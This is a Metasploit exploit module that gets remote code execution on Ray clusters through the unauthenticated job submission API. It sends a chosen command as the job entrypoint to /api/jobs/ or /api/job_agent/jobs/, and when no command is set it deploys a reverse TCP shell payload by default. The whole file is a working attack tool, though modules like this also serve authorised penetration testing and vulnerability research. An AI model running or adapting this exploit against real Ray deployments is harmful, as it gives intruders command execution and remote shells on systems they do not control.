class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Ray Agent Job RCE',
      'Description'    => %q{
        RCE in Ray via the agent job submission endpoint. This is intended functionality as Ray's main purpose is executing arbitrary workloads.
        By default, Ray has no authentication.
      },
      'Author'         => ['sierrabearchell', 'byt3bl33d3r <marcello@protectai.com>', 'Akos Jakab'],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['URL', 'https://huntr.com/bounties/b507a6a0-c61a-4508-9101-fceb572b0385/'],
          ['URL', 'https://huntr.com/bounties/787a07c0-5535-469f-8c53-3efa4e5717c7/'],
          ['URL', 'https://www.vicarius.io/vsociety/']
        ],
      'Platform'       => 'linux',
      'Targets'        => [['Automatic', {}]],
      'DefaultTarget'  => 0,
      'DisclosureDate' => '2023-11-15',
      'DefaultOptions' => {
        'RPORT' => 8265,
        'SSL'   => false,
        'PAYLOAD' => 'linux/x64/shell/reverse_tcp'
      }
    ))

    register_options(
      [
        OptString.new('COMMAND', [false, 'The command to execute', '']),
      ])
  end

  def check
    # Simple check to see if target is reachable; consider enhancing based on app's specific behavior or endpoints
    res = send_request_cgi('uri' => '/')
    return res.nil? ? CheckCode::Unknown : CheckCode::Detected
  end

  def execute_command(cmd, opts = {})
    target_uri_paths = ['/api/jobs/', '/api/job_agent/jobs/']
    target_uri_paths.each do |uri|
      begin
        res = send_request_cgi({
          'method' => 'POST',
          'uri'    => normalize_uri(uri),
          'ctype'  => 'application/json',
          'data'   => {'entrypoint' => cmd}.to_json
        })
        
        unless res
          print_error("Failed to receive response for #{uri}")
          next
        end
        
        if res.code == 200
          print_good("Command execution successful: #{cmd}")
          job_data = res.get_json_document
          print_status("Job ID: #{job_data['job_id']}, Submission ID: #{job_data['submission_id']}")
          return
        else
          print_error("Failed command execution for #{uri}: HTTP #{res.code}")
        end
      rescue ::Rex::ConnectionError => e
        print_error("Failed to connect to the server: #{e.message}")
        return
      end
    end
    fail_with(Failure::Unknown, "Command execution failed for all paths")
  end

  def exploit
    if datastore['COMMAND'].nil? || datastore['COMMAND'].empty?
      print_status('No custom command specified, executing reverse shell...')
      execute_cmdstager
    else
      print_status("Executing custom command: #{datastore['COMMAND']}")
      execute_command(datastore['COMMAND'])
    end
  end
end
